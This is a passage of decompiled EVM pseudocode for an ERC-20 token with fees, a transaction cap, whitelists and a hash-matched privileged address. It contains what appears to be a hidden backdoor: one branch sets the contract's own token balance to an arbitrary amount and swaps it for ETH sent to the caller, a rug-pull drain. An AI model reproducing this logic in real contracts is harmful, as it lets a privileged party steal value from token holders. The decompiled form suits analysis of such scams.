                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if not arg2:
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if arg2 and _fee > -1 / arg2:
                                                        revert with 'NH{q', 17
                                                    if not arg2:
                                                        revert with 'NH{q', 18
                                                    if arg2 * _fee / arg2 != _fee:
                                                        revert with 0, 'SafeMath: multiplication overflow'
                                                    require arg2 <= _maxTxAmount
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.factory() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(stor16)
                                                    staticcall stor16.WETH() with:
                                                            gas gas_remaining wei
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    require ext_code.size(address(ext_call.return_data[0]))
                                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                            gas gas_remaining wei
                                                           args address(this.address), address(ext_call.return_data[0])
                                                    if not ext_call.success:
                                                        revert with ext_call.return_data[0 len return_data.size]
                                                    require return_data.size >= 32
                                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                    if ext_call.return_data[12 len 20] != arg1:
                                                        stor15.length++
                                                        stor15[stor15.length].field_0 = arg1
                                                        stor15[stor15.length].field_256 = arg2
                                                    if arg2 < arg2 * _fee / 100:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[0] += arg2 * _fee / 100
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                    emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                    if arg2 * _fee / 100 > 0:
                                                        emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                    else:
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7122 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7140 = mem[_7122]
                        require mem[_7122] == mem[_7122 + 12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7188 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7222 = mem[_7188]
                        require mem[_7188] == mem[_7188 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7222)
                        require ext_code.size(address(_7140))
                        staticcall address(_7140).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7222)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7392 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7464 = mem[_7392]
                        require mem[_7392] == mem[_7392 + 12 len 20]
                        if mem[_7392 + 12 len 20] != msg.sender:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7836 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7836 + 32 len mem[_7836]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7464):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7864 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7864 + 32 len mem[_7864]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor6[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
        else:
            if msg.sender == arg1:
                if not this.address:
                    revert with 0, 'IERC20: approve from the zero address'
                if not stor16:
                    revert with 0, 'IERC20: approve to the zero address'
                allowance[address(this.address)][stor16] = arg2
                emit Approval(arg2, this.address, stor16);
                balanceOf[address(this.address)] = arg2
                mem[180] = this.address
                require ext_code.size(stor16)
                staticcall stor16.WETH() with:
                        gas gas_remaining wei
                mem[244] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[212] = ext_call.return_data[12 len 20]
                stor14 = 1
                if block.timestamp > -21:
                    revert with 'NH{q', 17
                mem[ceil32(return_data.size) + 244] = 0x791ac94700000000000000000000000000000000000000000000000000000000
                mem[ceil32(return_data.size) + 248] = arg2
                idx = 0
                s = 180
                t = ceil32(return_data.size) + 440
                while idx < 2:
                    mem[t] = mem[s + 12 len 20]
                    idx = idx + 1
                    s = s + 32
                    t = t + 32
                    continue 
                require ext_code.size(stor16)
                call stor16.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                     gas gas_remaining wei
                    args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 440 len 64]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                stor14 = 0
            else:
                if stor14:
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    mem[148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    mem[ceil32(return_data.size) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    mem[(2 * ceil32(return_data.size)) + 152] = this.address
                    mem[(2 * ceil32(return_data.size)) + 184] = address(ext_call.return_data[0])
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    mem[(2 * ceil32(return_data.size)) + 148] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    mem[64] = (4 * ceil32(return_data.size)) + 148
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if ext_call.return_data[12 len 20] != msg.sender:
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if arg1 == ext_call.return_data[12 len 20]:
                            if stor6[address(msg.sender)]:
                                if stor6[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if arg1 == this.address:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor6[address(msg.sender)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if stor14:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                    return 1
                                if not arg2:
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(stor16)
                                    staticcall stor16.factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(stor16)
                                    staticcall stor16.WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor15.length++
                                    stor15[stor15.length].field_0 = arg1
                                    stor15[stor15.length].field_256 = arg2
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                else:
                                    if arg2 and _fee > -1 / arg2:
                                        revert with 'NH{q', 17
                                    if not arg2:
                                        revert with 'NH{q', 18
                                    if arg2 * _fee / arg2 != _fee:
                                        revert with 0, 'SafeMath: multiplication overflow'
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(stor16)
                                    staticcall stor16.factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(stor16)
                                    staticcall stor16.WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
